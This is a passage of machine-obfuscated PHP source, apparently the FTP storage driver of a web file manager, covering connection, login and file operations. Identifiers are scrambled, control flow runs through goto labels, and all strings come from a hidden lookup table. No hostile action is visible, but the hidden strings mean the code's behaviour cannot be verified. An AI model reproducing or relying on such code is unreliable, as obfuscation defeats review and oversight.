implode($A”Àî‡§·Ñ[8], $C√ﬂàùßº¡); $EŸÈêÖÕ≥— = array($A”Àî‡§·Ñ[1200] => gmdate($A”Àî‡§·Ñ[1199], strtotime($A”Àî‡§·Ñ[1238])), $A”Àî‡§·Ñ[1201] => array(array($A”Àî‡§·Ñ[1203] => $this->bucket), array($A”Àî‡§·Ñ[1202] => $C´ﬂ¬ã∞É©), array($A”Àî‡§·Ñ[1204], $A”Àî‡§·Ñ[1205], $A”Àî‡§·Ñ[33]), array($A”Àî‡§·Ñ[1204], $A”Àî‡§·Ñ[1239], $A”Àî‡§·Ñ[33]), array($A”Àî‡§·Ñ[1204], $A”Àî‡§·Ñ[1240], $A”Àî‡§·Ñ[33]), array($A”Àî‡§·Ñ[1206] => $B∞≠¬»„åà), array($A”Àî‡§·Ñ[1241] => $DÜµàÀ“±Á), array($A”Àî‡§·Ñ[1242] => $dâùÿ√Üç‡), array($A”Àî‡§·Ñ[1243] => $CË“˘ªÚ¢ä), array($A”Àî‡§·Ñ[1244] => $D◊Í¬∂ÉÁ⁄))); goto aﬂ∂âøòˆ∫; açË”‡’Ó„: $aè≥≤Õ∆öÇ = $A”Àî‡§·Ñ[59]; $CË“˘ªÚ¢ä = gmdate($A”Àî‡§·Ñ[1236]); $eÒ∑≈Öﬁä® = gmdate($A”Àî‡§·Ñ[724]); goto fÖ´™°çå∆; Eïêñ»òπ©: $a£ˆì¨òÿû = array($A”Àî‡§·Ñ[211] => $A”Àî‡§·Ñ[33], $A”Àî‡§·Ñ[1247] => $A”Àî‡§·Ñ[33], $A”Àî‡§·Ñ[1202] => $C´ﬂ¬ã∞É©, $A”Àî‡§·Ñ[1206] => $B∞≠¬»„åà, $A”Àî‡§·Ñ[1210] => $e≈üÈ·é¯⁄, $A”Àî‡§·Ñ[1248] => $DÜµàÀ“±Á, $A”Àî‡§·Ñ[1249] => $dâùÿ√Üç‡, $A”Àî‡§·Ñ[1250] => $CË“˘ªÚ¢ä, $A”Àî‡§·Ñ[1251] => $D◊Í¬∂ÉÁ⁄, $A”Àî‡§·Ñ[1252] => $b‚Ó±è®âÃ, $A”Àî‡§·Ñ[175] => $this->getHost()); return $a£ˆì¨òÿû; goto dÀ¢ôê»“¬; dÀ¢ôê»“¬: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($AÙŒê¥ëÏı) { parent::__construct(); if (count($AÙŒê¥ëÏı) > 0) { $this->_init($AÙŒê¥ëÏı); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($FÙ“«Ñıìù) { $fá•Çòÿ˘¢ =& $_SERVER[Öíæ€“”≠éÏË]; global $config; $this->appCharset = $config[$fá•Çòÿ˘¢[1253]]; $this->systemCharset = $config[$fá•Çòÿ˘¢[1254]]; if (isset($FÙ“«Ñıìù[$fá•Çòÿ˘¢[1255]]) && $FÙ“«Ñıìù[$fá•Çòÿ˘¢[1255]]) { $this->systemCharset = $FÙ“«Ñıìù[$fá•Çòÿ˘¢[1255]]; } } public function iconvApp($eÙ’Óäñ‰µ) { return $this->iconvTo($eÙ’Óäñ‰µ, $this->systemCharset, $this->appCharset); } public function iconvSystem($D¨öø«Ãà€) { return $this->iconvTo($D¨öø«Ãà€, $this->appCharset, $this->systemCharset); } public function getPathOuter($a„˘ Ü≤˘–) { goto Aõı€¢¡Üã; Fé´Œ ã‘ñ: return $this->pathDriver . $b˘’Æç’ßÑ[8] . ltrim($a„˘ Ü≤˘–, $b˘’Æç’ßÑ[8]); goto F‰á∂Õ≠ìµ; Aõı€¢¡Üã: $b˘’Æç’ßÑ =& $_SERVER[Öíæ€“”≠éÏË]; $dãÇ¶–¿˘¨ = $this->iconvApp($this->pathBase); $a„˘ Ü≤˘– = $this->iconvApp($a„˘ Ü≤˘–); goto b÷‚≥˘îìù; c¡≈—⁄¬ÍÒ: $a„˘ Ü≤˘– = KodIO::clear($a„˘ Ü≤˘–); $a„˘ Ü≤˘– = substr($a„˘ Ü≤˘–, strlen($dãÇ¶–¿˘¨)); if (empty($this->pathDriver)) { return $a„˘ Ü≤˘–; } goto Fé´Œ ã‘ñ; b÷‚≥˘îìù: if (substr($dãÇ¶–¿˘¨, 0, 2) == $b˘’Æç’ßÑ[1256]) { $dãÇ¶–¿˘¨ = BASIC_PATH . substr($dãÇ¶–¿˘¨, 2); } if (substr($a„˘ Ü≤˘–, 0, 2) == $b˘’Æç’ßÑ[1256]) { $a„˘ Ü≤˘– = BASIC_PATH . substr($a„˘ Ü≤˘–, 2); } $dãÇ¶–¿˘¨ = KodIO::clear($dãÇ¶–¿˘¨); goto c¡≈—⁄¬ÍÒ; F‰á∂Õ≠ìµ: } private function _init($Dä›€ÂΩﬂÎ = array()) { $DâÛÓ’éΩå =& $_SERVER[Öíæ€“”≠éÏË]; if (!function_exists($DâÛÓ’éΩå[1257])) { throw new Exception(LNG($DâÛÓ’éΩå[1258])); } $this->config = $Dä›€ÂΩﬂÎ; $this->charsetReset($Dä›€ÂΩﬂÎ); foreach ($Dä›€ÂΩﬂÎ as $F ‡Òÿ‡⁄” => $Eè∫®˜ãË›) { if (isset($this->{$F ‡Òÿ‡⁄”})) { $this->{$F ‡Òÿ‡⁄”} = $Eè∫®˜ãË›; } } return $this->_login($Dä›€ÂΩﬂÎ); } private function _login($aÉåö⁄¶ÌÌ) { goto D≠⁄£úÚûê; cìÂß¿±Ñø: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $a—ÓÇÛªÖé = @ftp_login($this->connect, $this->username, $this->userpass); goto B°∑æöíÃ≠; D≠⁄£úÚûê: $aØã»ΩÙÜ… =& $_SERVER[Öíæ€“”≠éÏË]; static $EÒ´ßú æü = array(); $cµ§πÖıÂ≈ = md5(json_encode($aÉåö⁄¶ÌÌ)); goto d‚ä¬Áßõê; d‚ä¬Áßõê: if (isset($EÒ´ßú æü[$cµ§πÖıÂ≈])) { foreach ($EÒ´ßú æü[$cµ§πÖıÂ≈] as $F≤ÇóˆÖáË => $a›ïäÂÑ¬à) { $this->{$F≤ÇóˆÖáË} = $a›ïäÂÑ¬à; } return !0; } $A…Æ‘‹º”Ì = parse_url(trim($this->server, $aØã»ΩÙÜ…[8])); $this->host = $A…Æ‘‹º”Ì[$aØã»ΩÙÜ…[175]]; goto d”ÆµËç±–; B°∑æöíÃ≠: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Dﬁ≥ÆÀ§Óà = $this->pasv == $aØã»ΩÙÜ…[87] ? !0 : !1; @ftp_pasv($this->connect, $Dﬁ≥ÆÀ§Óà); goto FµÍÀçãÆ‘; FµÍÀçãÆ‘: $EÒ´ßú æü[$cµ§πÖıÂ≈] = array($aØã»ΩÙÜ…[1262] => $this->connect, $aØã»ΩÙÜ…[175] => $this->host, $aØã»ΩÙÜ…[174] => $this->scheme, $aØã»ΩÙÜ…[176] => $this->port); return $a—ÓÇÛªÖé; goto fø®èÇçÈ£; d”ÆµËç±–: $dõ∂µéÖÿ¢ = isset($A…Æ‘‹º”Ì[$aØã»ΩÙÜ…[174]]) && $A…Æ‘‹º”Ì[$aØã»ΩÙÜ…[174]] == $aØã»ΩÙÜ…[1259] ? !0 : !1; $this->scheme = $dõ∂µéÖÿ¢ ? $aØã»ΩÙÜ…[1260] : $aØã»ΩÙÜ…[1261]; $this->port = isset($A…Æ‘‹º”Ì[$aØã»ΩÙÜ…[176]]) ? $A…Æ‘‹º”Ì[$aØã»ΩÙÜ…[176]] : 21; goto cìÂß¿±Ñø; fø®èÇçÈ£: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($a∆Ù¿ÃïòÒ, $EÂ´Üî·‹“ = '', $b∞Ãì⁄·òÈ = REPEAT_RENAME) { if ($this->setContent($a∆Ù¿ÃïòÒ, $EÂ´Üî·‹“)) { return $this->getPathOuter($a∆Ù¿ÃïòÒ); } return !1; } public function mkdir($a¨ë•Ú±˘˘, $cÜ¨àûŒ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $a¨ë•Ú±˘˘ = $this->iconvSystem($a¨ë•Ú±˘˘); if ($this->_isFolder($a¨ë•Ú±˘˘) || @ftp_mkdir($this->connect, $a¨ë•Ú±˘˘)) { return $this->getPathOuter($a¨ë•Ú±˘˘); } if (!$this->mkdir($this->pathFather($a¨ë•Ú±˘˘))) { return !1; } if ($a¨ë•Ú±˘˘ = @ftp_mkdir($this->connect, $a¨ë•Ú±˘˘)) { return $this->getPathOuter($a¨ë•Ú±˘˘); } return !1; } public function copyFile($CíÕÖÀ¢ç∏, $bÍçêëéóë) { goto eâ√ÚÓñÇ“; eâ√ÚÓñÇ“: if (!$this->_isconn()) { return !1; } $Aå⁄Ì©à›Ö = $this->pathThis($this->iconvSystem($CíÕÖÀ¢ç∏)); $Aëú€€ëÒ® = $this->tempFile($Aå⁄Ì©à›Ö); goto AÆ⁄åœ¡≥; c∫ûﬁóäù„: $this->tempFileRemve($Aëú€€ëÒ®); return $D÷πÛ˜ÂÖ∏; goto aÍ∫∂–¢à∞; AÆ⁄åœ¡≥: $Bâπê¶§πÖ = $this->iconvApp($Aëú€€ëÒ®); $this->download($CíÕÖÀ¢ç∏, $Bâπê¶§πÖ); $D÷πÛ˜ÂÖ∏ = $this->upload($bÍçêëéóë, $Bâπê¶§πÖ); goto c∫ûﬁóäù„; aÍ∫∂–¢à∞: } public function moveFile($eÆ…ÙŸàÖÚ, $fµº¡Î€ß) { if (!$this->_isconn()) { return !1; } $eÆ…ÙŸàÖÚ = $this->iconvSystem($eÆ…ÙŸàÖÚ); $fµº¡Î€ß = $this->iconvSystem($fµº¡Î€ß); $EËÕáÃﬁçù = @ftp_rename($this->connect, $eÆ…ÙŸàÖÚ, $fµº¡Î€ß); return $EËÕáÃﬁçù ? $this->getPathOuter($fµº¡Î€ß) : !1; } public function delFile($båÑè´Õ∞≤) { if (!$this->_isconn()) { return !1; } $båÑè´Õ∞≤ = $this->iconvSystem($båÑè´Õ∞≤); return @ftp_delete($this->connect, $båÑè´Õ∞≤); } public function delFolder($FÊØ¢ÎôÌÃ) { goto fÁÎÖôëãõ; aﬁ£≠¨è…œ: foreach ($Fò≥ªààÍí as $EîÒà™ËæÑ) { $EîÒà™ËæÑ = $this->iconvSystem($EîÒà™ËæÑ); $AÔ¡·”éÙ◊ = @ftp_rmdir($this->connect, $EîÒà™ËæÑ); if (!$AÔ¡·”éÙ◊) { return !1; } } $FÊØ¢ÎôÌÃ = $this->iconvSystem($FÊØ¢ÎôÌÃ); return @ftp_rmdir($this->connect, $FÊØ¢ÎôÌÃ); goto Aé•ÿ–Íåı; fÁÎÖôëãõ: if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Fò≥ªààÍí = $AùãÊóåÖã = array(); goto c≥ŒâÛæ‡Œ; c≥ŒâÛæ‡Œ: $this->fileList($FÊØ¢ÎôÌÃ, $Fò≥ªààÍí, $AùãÊóåÖã, !0); $this->listItemCache = !0; foreach ($AùãÊóåÖã as $c√†êàíú≤) { $EîÒà™ËæÑ = $this->iconvSystem($c√†êàíú≤[$_SERVER[Öíæ€“”≠éÏË][28]]); $AÔ¡·”éÙ◊ = @ftp_delete($this->connect, $EîÒà™ËæÑ); if (!$AÔ¡·”éÙ◊) { return !1; } } goto aﬁ£≠¨è…œ; Aé•ÿ–Íåı: } public function rename($eÈıŒµ∆≤˘, $fôÿÙï»£Ó) { goto f‚Ùå‹Ôﬁœ; CÀÎ—®úÕ√: $a°â°òë∂Ÿ = rtrim($b∆â›ô•‘±, $FùÍ¨®∆áØ[8]) . $FùÍ¨®∆áØ[8] . $e˜‹°°ÉÃª; $fÆí®ô«õ¶ = @ftp_rename($this->connect, $eÈıŒµ∆≤˘, $a°â°òë∂Ÿ); $a°â°òë∂Ÿ = $this->iconvApp($a°â°òë∂Ÿ); goto Dà∂§íÂ–; Dà∂§íÂ–: return $fÆí®ô«õ¶ ? $this->getPathOuter($a°â°òë∂Ÿ) : !1; goto CÃïè–åÇû; AÚÌöçèÉÜ: $e˜‹°°ÉÃª = $this->iconvSystem($e˜‹°°ÉÃª); $eÈıŒµ∆≤˘ = $this->iconvSystem($eÈıŒµ∆≤˘); $b∆â›ô•‘± = $this->pathFather($eÈıŒµ∆≤˘); goto CÀÎ—®úÕ√; f‚Ùå‹Ôﬁœ: $FùÍ¨®∆áØ =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->_isconn()) { return !1; } $e˜‹°°ÉÃª = $this->fileNameAuto($this->pathFather($eÈıŒµ∆≤˘), $fôÿÙï»£Ó); goto AÚÌöçèÉÜ; CÃïè–åÇû: } private function folderInfo($Eö…ﬁµ˜ﬂ∫, $a™”ÍãÚÍ« = false) { $c¢ìÌ”ã«∞ =& $_SERVER[Öíæ€“”≠éÏË]; $A ˜Ó»í·‡ = array($c¢ìÌ”ã«∞[28] => $this->pathThis($Eö…ﬁµ˜ﬂ∫), $c¢ìÌ”ã«∞[76] => $this->getPathOuter($c¢ìÌ”ã«∞[8] . $Eö…ﬁµ˜ﬂ∫), $c¢ìÌ”ã«∞[29] => $c¢ìÌ”ã«∞[77]); if ($a™”ÍãÚÍ«) { return $A ˜Ó»í·‡; } $A ˜Ó»í·‡[$c¢ìÌ”ã«∞[194]] = $A ˜Ó»í·‡[$c¢ìÌ”ã«∞[84]] = 0; $A ˜Ó»í·‡[$c¢ìÌ”ã«∞[195]] = $A ˜Ó»í·‡[$c¢ìÌ”ã«∞[196]] = !0; return $A ˜Ó»í·‡; } private function fileInfo($aã∂êÎæ™“, $c–Œò·˘€‡ = false, $CËá«‹Ö∞π = array()) { goto EèΩ”ÇÁÿÁ; C–°ﬁ⁄¶˜à: $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[84]] = @ftp_mdtm($this->connect, $c¢™ìå“·£); if (empty($CËá«‹Ö∞π)) { $CËá«‹Ö∞π = $this->objectMeta($aã∂êÎæ™“); if (!$CËá«‹Ö∞π) { return $EÇê”ÇûÔ©; } } $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[78]] = $CËá«‹Ö∞π[$aÍëÎâ¢Çè[78]]; goto Eã∫∑îÑÒà; Eã∫∑îÑÒà: return $EÇê”ÇûÔ©; goto A¥©ïßêüª; eËÆûˆ°Î¨: $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[194]] = $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[84]] = 0; $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[195]] = $EÇê”ÇûÔ©[$aÍëÎâ¢Çè[196]] = !0; $c¢™ìå“·£ = $this->iconvSystem($aã∂êÎæ™“); goto C–°ﬁ⁄¶˜à; EèΩ”ÇÁÿÁ: $aÍëÎâ¢Çè =& $_SERVER[Öíæ€“”≠éÏË]; $EÇê”ÇûÔ© = array($aÍëÎâ¢Çè[28] => $this->pathThis($aã∂êÎæ™“), $aÍëÎâ¢Çè[76] => $this->getPathOuter($aÍëÎâ¢Çè[8] . $aã∂êÎæ™“), $aÍëÎâ¢Çè[29] => $aÍëÎâ¢Çè[193], $aÍëÎâ¢Çè[78] => isset($CËá«‹Ö∞π[$aÍëÎâ¢Çè[78]]) ? $CËá«‹Ö∞π[$aÍëÎâ¢Çè[78]] : 0, $aÍëÎâ¢Çè[168] => $this->ext($aã∂êÎæ™“)); if ($c–Œò·˘€‡) { return $EÇê”ÇûÔ©; } goto eËÆûˆ°Î¨; A¥©ïßêüª: } public function size($DÃÔıîàåõ) { $D≤æ‹„Ü¡• = $this->objectMeta($DÃÔıîàåõ); return $D≤æ‹„Ü¡• ? $D≤æ‹„Ü¡•[$_SERVER[Öíæ€“”≠éÏË][78]] : 0; } public function info($FëãÙÀì“È) { if ($this->isFile($FëãÙÀì“È)) { return $this->fileInfo($FëãÙÀì“È, 0); } else { if ($this->isFolder($FëãÙÀì“È)) { return $this->folderInfo($FëãÙÀì“È); } } return !1; } private function fileList($Cπ±ÛØøÈ¬, &$E‰»ë©ÖÖ·, &$bàãı†—Ú˘, $eÁ⁄‘∏Ûå∂ = false) { goto bÌÍÕç√∂â; e”£ıºˆ¿¡: $CøüﬂÒé÷Ü = $this->listItemCache === !1 ? !1 : !0; $fÆí„…¬÷‚ = @ftp_rawlist($this->connect, $Cπ±ÛØøÈ¬); if (!$fÆí„…¬÷‚) { $fÆí„…¬÷‚ = array(); } goto CËíÃ¶∞á¥; bÌÍÕç√∂â: $f¬‚»àÇ⁄• =& $_SERVER[Öíæ€“”≠éÏË]; $Cπ±ÛØøÈ¬ = $this->iconvSystem($Cπ±ÛØøÈ¬); if (!$this->isFolder($Cπ±ÛØøÈ¬)) { return !1; } goto FÔ„Ë⁄ª€ﬂ; CËíÃ¶∞á¥: $B˘√œÉÏÜ∏ = array($f¬‚»àÇ⁄•[95] => 1, $f¬‚»àÇ⁄•[1263] => 1); foreach ($fÆí„…¬÷‚ as $cÀã¢Ç±Ö£) { goto Bßßù–Ë≤µ; AªıÚ°Ï—Ò: if ($f®óŸ‘‡áÂ) { $E‰»ë©ÖÖ·[] = $C£Ê´ÖΩ˘Œ; if ($eÁ⁄‘∏Ûå∂) { $this->fileList($C£Ê´ÖΩ˘Œ, $E‰»ë©ÖÖ·, $bàãı†—Ú˘, $eÁ⁄‘∏Ûå∂); } continue; } $bàãı†—Ú˘[] = $D¢ö„œ…À“; goto E¯Ê∞∂“π…; E˘™…Üÿå÷: if (substr($cÀã¢Ç±Ö£, 0, 1) == $f¬‚»àÇ⁄•[1264]) { $D¢ö„œ…À“[$f¬‚»àÇ⁄•[29]] = $f¬‚»àÇ⁄•[77]; $D¢ö„œ…À“[$f¬‚»àÇ⁄•[78]] = 0; } $f®óŸ‘‡áÂ = $D¢ö„œ…À“[$f¬‚»àÇ⁄•[29]] == $f¬‚»àÇ⁄•[77] ? !0 : !1; if ($CøüﬂÒé÷Ü) { $this->cacheMethod($f¬‚»àÇ⁄•[199], $C£Ê´ÖΩ˘Œ, $f®óŸ‘‡áÂ); $this->cacheMethod($f¬‚»àÇ⁄•[200], $C£Ê´ÖΩ˘Œ, $D¢ö„œ…À“); } goto AªıÚ°Ï—Ò; F±›∑û‹¥Ö: if (empty($C£Ê´ÖΩ˘Œ) && $C£Ê´ÖΩ˘Œ !== $f¬‚»àÇ⁄•[191] || isset($B˘√œÉÏÜ∏[$C£Ê´ÖΩ˘Œ])) { continue; } $C£Ê´ÖΩ˘Œ = $this->iconvApp($Cπ±ÛØøÈ¬ . ltrim($C£Ê´ÖΩ˘Œ, $f¬‚»àÇ⁄•[8])); $D¢ö„œ…À“ = array($f¬‚»àÇ⁄•[28] => $C£Ê´ÖΩ˘Œ, $f¬‚»àÇ⁄•[29] => $f¬‚»àÇ⁄•[193], $f¬‚»àÇ⁄•[78] => $e¨⁄ã±íÑï[4]); goto E˘™…Üÿå÷; Bßßù–Ë≤µ: $e¨⁄ã±íÑï = $this->_listItem($cÀã¢Ç±Ö£); if ($e¨⁄ã±íÑï[0] == $f¬‚»àÇ⁄•[732]) { continue; } $C£Ê´ÖΩ˘Œ = $e¨⁄ã±íÑï[8]; goto F±›∑û‹¥Ö; E¯Ê∞∂“π…: } if ($CøüﬂÒé÷Ü) { $this->cacheMethod($f¬‚»àÇ⁄•[199], $Cπ±ÛØøÈ¬, !0); } goto A•ÜÈı÷âï; FÔ„Ë⁄ª€ﬂ: @ftp_chdir($this->connect, $f¬‚»àÇ⁄•[8]); $Cπ±ÛØøÈ¬ = rtrim($Cπ±ÛØøÈ¬, $f¬‚»àÇ⁄•[8]) . $f¬‚»àÇ⁄•[8]; check_abort(); goto e”£ıºˆ¿¡; A•ÜÈı÷âï: } private function _listItem($C”Ñ˜«ë€´) { if (empty($C”Ñ˜«ë€´)) { return array(); } $aö¬“ˆè•◊ = preg_split($_SERVER[Öíæ€“”≠éÏË][1265], $C”Ñ˜«ë€´); if (count($aö¬“ˆè•◊) <= 9) { return $aö¬“ˆè•◊; } $aö¬“ˆè•◊[8] = trim(substr($C”Ñ˜«ë€´, strpos($C”Ñ˜«ë€´, $aö¬“ˆè•◊[7]) + strlen($aö¬“ˆè•◊[7]))); return array_splice($aö¬“ˆè•◊, 0, 9); } public function listPath($D–ê›Œ∏«Ω, $E≥ö·ÖÏı¶ = false) { goto BÂï÷™ Ç‰; BÂï÷™ Ç‰: $då¢ûôΩƒ— =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->_isconn()) { return !1; } $D¥†∫å∑Ñà = $Aéﬁﬂ¶îÏ§ = array(); goto EÑ◊ÓààÎø; f”‘å±¶Œ¢: return array($då¢ûôΩƒ—[75] => $D¥†∫å∑Ñà, $då¢ûôΩƒ—[74] => $Aéﬁﬂ¶îÏ§); goto bÉÂñáÓ∑; EÑ◊ÓààÎø: $this->fileList($D–ê›Œ∏«Ω, $D¥†∫å∑Ñà, $Aéﬁﬂ¶îÏ§); foreach ($D¥†∫å∑Ñà as $DÓ‚∂áçª≥ => $bòˆ†ˆ·√¬) { $D¥†∫å∑Ñà[$DÓ‚∂áçª≥] = $this->folderInfo($bòˆ†ˆ·√¬, $E≥ö·ÖÏı¶); } foreach ($Aéﬁﬂ¶îÏ§ as $DÓ‚∂áçª≥ => $bòˆ†ˆ·√¬) { $Aéﬁﬂ¶îÏ§[$DÓ‚∂áçª≥] = $this->fileInfo($bòˆ†ˆ·√¬[$då¢ûôΩƒ—[28]], $E≥ö·ÖÏı¶, $bòˆ†ˆ·√¬); } goto f”‘å±¶Œ¢; bÉÂñáÓ∑: } public function has($C∂ïÂ≥çèÜ, $Eë’ä…Ç–Á = false, $AÃ”÷Ê™ﬁÛ = true) { goto CÆÂÜç≤Œ«; DáïŒÏ ∞Ã: return !1; goto Eóêæ∆íÓÈ; CÓì¶„∫¬û: $this->fileList($C∂ïÂ≥çèÜ, $CÃ’¯áòëú, $BÜ‹’åÖî‚, $a·ÙÌõ¿Æé); if ($Eë’ä…Ç–Á) { return array($B™Éº…Ñ‹ù[203] => count($BÜ‹’åÖî‚), $B™Éº…Ñ‹ù[204] => count($CÃ’¯áòëú)); } if ($AÃ”÷Ê™ﬁÛ) { if (count($BÜ‹’åÖî‚)) { return !0; } } else { if (count($CÃ’¯áòëú)) { return !0; } } goto DáïŒÏ ∞Ã; CÆÂÜç≤Œ«: $B™Éº…Ñ‹ù =& $_SERVER[Öíæ€“”≠éÏË]; $CÃ’¯áòëú = $BÜ‹’åÖî‚ = array(); $a·ÙÌõ¿Æé = $Eë’ä…Ç–Á ? !0 : !1; goto CÓì¶„∫¬û; Eóêæ∆íÓÈ: } public function listAll($béÃ∆¬äΩ¬) { goto EÁ§‘¡ñÍ‚; f≥±ò◊Ò¯À: $this->fileList($béÃ∆¬äΩ¬, $FÈ⁄û±¬èÊ, $fÓøﬁë–êà, !0); $bÿ¨Çå¢üã = array(); foreach ($fÓøﬁë–êà as $c©ΩêÑ‘´©) { $bÿ¨Çå¢üã[$c©ΩêÑ‘´©[$DÕçèâ≈¯ö[28]]] = $c©ΩêÑ‘´©[$DÕçèâ≈¯ö[78]]; } goto e⁄ﬂ¥·•µç; e⁄ﬂ¥·•µç: foreach ($FÈ⁄û±¬èÊ as $c©ΩêÑ‘´©) { if (is_string($c©ΩêÑ‘´©)) { $bÿ¨Çå¢üã[$c©ΩêÑ‘´©] = 0; } } return $this->listAllFiles($béÃ∆¬äΩ¬, array_keys($bÿ¨Çå¢üã), $bÿ¨Çå¢üã); goto båÁÎêõææ; EÁ§‘¡ñÍ‚: $DÕçèâ≈¯ö =& $_SERVER[Öíæ€“”≠éÏË]; if (!$this->_isconn()) { return !1; } $FÈ⁄û±¬èÊ = $fÓøﬁë–êà = array(); goto f≥±ò◊Ò¯À; båÁÎêõææ: } public function getContent($BÁõ·¯∞å‡) { if (!$this->_isconn()) { return !1; } $BÁõ·¯∞å‡ = $this->iconvSystem($BÁõ·¯∞å‡); return $this->fileSubstr($BÁõ·¯∞å‡); } public function setContent($bé∑ÇóÏ´◊, $eèì±†öÀö = '') { goto F¨úÏü¥ºÊ; E«†ÓÎ‡¨: file_put_contents($f—ãÛ’Ñæ–, $eèì±†öÀö); $E°äÖÒ∑äÓ = $this->upload($bé∑ÇóÏ´◊, $this->iconvApp($f—ãÛ’Ñæ–)); $this->tempFileRemve($f—ãÛ’Ñæ–); goto b√∏∞˜¬ÙÌ; b√∏∞˜¬ÙÌ: return $E°äÖÒ∑äÓ; goto c© ‰óò¯á; F¨úÏü¥ºÊ: if (!$this->_isconn()) { return !1; } $Aø„ç•∂õâ = $this->pathThis($this->iconvSystem($bé∑ÇóÏ´◊)); $f—ãÛ’Ñæ– = $this->tempFile($Aø„ç•∂õâ); goto E«†ÓÎ‡¨; c© ‰óò¯á: } public function fileSubstr($b’åŒ…¯∆ﬁ, $bçì§†Á›ı = 0, $b◊ÜÏêóµÑ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($b’åŒ…¯∆ﬁ, $bçì§†Á›ı, $b◊ÜÏêóµÑ); } private function ftpRequest($CÛ•¥»È•ò, $e©≈ùèﬂ˜® = 0, $bùô∏¬…‡É = false) { goto dÃßä‰úÍ‘; c◊⁄ÔÔ´ú¯: return $aùâ´… ÛÆ; goto E∏¡—€Éãﬂ; BèöÉ≥ÍêΩ: curl_setopt($bèººÛàπË, CURLOPT_URL, $béÒ·äë‚ü . $this->pathEncode($CÛ•¥»È•ò)); curl_setopt($bèººÛàπË, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($bùô∏¬…‡É) { $E“÷∞ÿ¬¨ë = $e©≈ùèﬂ˜® + $bùô∏¬…‡É - 1; curl_setopt($bèººÛàπË, CURLOPT_RANGE, "{$e©≈ùèﬂ˜®}\55{$E“÷∞ÿ¬¨ë}"); } goto FıÃ¥ˆÉº“; FıÃ¥ˆÉº“: curl_setopt($bèººÛàπË, CURLOPT_RETURNTRANSFER, 1); $aùâ´… ÛÆ = curl_exec($bèººÛàπË); curl_close($bèººÛàπË); goto c◊⁄ÔÔ´ú¯; dÃßä‰úÍ‘: $CÛ•¥»È•ò = $this->iconvSystem($CÛ•¥»È•ò); $béÒ·äë‚ü = $this->scheme . $this->host . $_SERVER[Öíæ€“”≠éÏË][4] . $this->port; $bèººÛàπË = curl_init(); goto BèöÉ≥ÍêΩ; E∏¡—€Éãﬂ: } public function upload($C◊‚ëçáéù, $C‹ÈıÜ–´ , $fÎÏ€¡∏ªì = false, $AèÙìÑø÷û = REPEAT_REPLACE) { goto eÁã˘¶¯àÖ; cÂÏÉôúé◊: $C‹ÈıÜ–´  = $this->iconvSystem($C‹ÈıÜ–´ ); $e©Ñ◊ã≥É‹ = ftp_nb_put($this->connect, $C◊‚ëçáéù, $C‹ÈıÜ–´ , FTP_BINARY); while ($e©Ñ◊ã≥É‹ == FTP_MOREDATA) { $e©Ñ◊ã≥É‹ = ftp_nb_continue($this->connect); } goto aãƒÆÖ›∫‘; eÁã˘¶¯àÖ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($C◊‚ëçáéù))) { return !1; } $C◊‚ëçáéù = $this->iconvSystem($C◊‚ëçáéù); goto cÂÏÉôúé◊; aãƒÆÖ›∫‘: if ($e©Ñ◊ã≥É‹ != FTP_FINISHED) { return !1; } return $this->getPathOuter($C◊‚ëçáéù); goto Dá∏⁄ ∑ãâ; Dá∏⁄ ∑ãâ: } public function download($EÍ›™ÔÕúŒ, $A≥ÂÕü◊äã = '') { goto e»‡øüôïü; A∫ƒñß™©°: $EÍ›™ÔÕúŒ = $this->iconvSystem($EÍ›™ÔÕúŒ); $A≥ÂÕü◊äã = $this->iconvSystem($A≥ÂÕü◊äã); $dœﬂú≥Ÿè∫ = ftp_nb_get($this->connect, $A≥ÂÕü◊äã, $EÍ›™ÔÕúŒ, FTP_BINARY); goto D´›Îúëë´; e»‡øüôïü: if (!$this->_isconn()) { return !1; } $Dˆﬂˆä©πÍ = $this->pathFather($A≥ÂÕü◊äã); if (!IO::mkdir($Dˆﬂˆä©πÍ)) { return !1; } goto A∫ƒñß™©°; D´›Îúëë´: while ($dœﬂú≥Ÿè∫ == FTP_MOREDATA) { $dœﬂú≥Ÿè∫ = ftp_nb_continue($this->connect); } if ($dœﬂú≥Ÿè∫ != FTP_FINISHED) { return !1; } return $this->iconvApp($A≥ÂÕü◊äã); goto Eñ∆ﬂêÏÎ‘; Eñ∆ﬂêÏÎ‘: } public function exist($C¡è”©«°Ï) { return $this->isFile($C¡è”©«°Ï) || $this->isFolder($C¡è”©«°Ï); } public function isFile($C†Ì¨éØøö) { return !$this->isFolder($C†Ì¨éØøö) && $this->objectMeta($C†Ì¨éØøö); } public function isFolder($bñãÒπ˘◊‹) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][199], $bñãÒπ˘◊‹); } protected function objectMeta($FÚé¿…Ú†ü) { return $this->cacheMethod($_SERVER[Öíæ€“”≠éÏË][200], $FÚé¿…Ú†ü); } protected function _objectMeta($Fƒ–•⁄Í¥⁄) { goto bäÜâ·√ ≥; Eº¡”ˆ⁄À¯: $Fƒ–•⁄Í¥⁄ = $this->iconvSystem($Fƒ–•⁄Í¥⁄); $f‡àèÓ„ ° = array($BË∂åµÿÊπ[28] => $this->iconvApp($Fƒ–•⁄Í¥⁄), $BË∂åµÿÊπ[29] => $BË∂åµÿÊπ[193], $BË∂åµÿÊπ[78] => 0); @ftp_chdir($this->connect, $BË∂åµÿÊπ[8]); goto d‹„îÇö∆Ç; d‹„îÇö∆Ç: $EŒàÕë∫©⁄ = @ftp_size($this->connect, 